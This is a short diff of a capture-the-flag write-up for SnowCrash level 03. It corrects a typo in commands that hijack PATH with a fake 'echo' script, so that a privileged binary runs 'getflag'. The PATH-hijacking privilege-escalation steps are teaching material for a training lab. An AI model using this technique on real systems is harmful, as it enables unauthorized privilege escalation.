@@ -31,7 +31,7 @@ Level 03
 *   It seems like `echo` is vulnerable to manipulation since it's called using `/usr/bin/env` which makes the computer use the first binary found in `PATH`
 *   So we should be able to create a script called echo to get the flag for us !
 	```console
-	level03@SnowCrash:~$ echo 'getflag' > /tmp/echo`
+	level03@SnowCrash:~$ echo 'getflag' > /tmp/echo
 	level03@SnowCrash:~$ export PATH=/tmp:$PATH
 	level03@SnowCrash:~$ ./level03
 	Exploit me
